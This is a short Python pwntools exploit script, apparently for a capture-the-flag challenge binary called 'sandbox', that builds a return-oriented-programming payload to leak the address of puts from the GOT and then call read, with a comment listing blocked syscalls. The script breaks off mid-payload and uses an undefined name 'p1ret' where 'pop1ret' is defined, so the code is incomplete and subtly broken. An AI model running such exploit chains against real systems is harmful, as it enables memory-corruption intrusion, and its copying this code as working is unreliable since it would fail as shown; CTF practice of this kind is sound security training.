#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = "i386"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./sandbox", env = {"LD_PRELOAD": "./libc.so.6"})
    #  io = process("")

else:
    io = remote("localhost", 9999)

elf = ELF("./sandbox")
libc = ELF("./libc.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

#  execve, open, clone, vfork, creat, openat
if __name__ == "__main__":
    putsPlt, putsGot = elf.plt["puts"], elf.got["puts"]
    readPlt = elf.plt["read"]
    pop1ret = 0x08048421
    pop3ret = 0x08048729
    
    payload = flat(putsPlt, p1ret, putsGot, readPlt, pop3ret, 0, )

